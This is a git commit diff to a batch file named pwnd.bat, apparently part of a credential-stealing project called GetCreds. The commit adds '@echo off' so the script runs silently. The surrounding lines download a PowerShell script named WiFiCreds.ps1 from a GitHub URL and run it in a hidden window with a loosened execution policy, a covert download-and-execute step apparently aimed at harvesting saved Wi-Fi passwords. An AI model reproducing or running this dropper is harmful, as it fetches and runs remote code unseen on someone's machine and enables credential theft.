fcf41e131b32e49d1c9f126a0ecb6999308088ae
Zmk55 <oreoboi@gmail.com>
2022-08-25 23:22:16 -0500

    Update pwnd.bat
    Run BAT file in silent mode

--- pwnd.bat
+++ pwnd.bat
@@ -1,3 +1,5 @@
+@echo off
+
 powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/Zmk55/GetCreds/main/WiFiCreds.ps1 -Outfil .\WifiCreds.ps1"
 
 powershell -WindowStyle hidden  -executionpolicy remotesigned -File .\WifiCreds.ps1
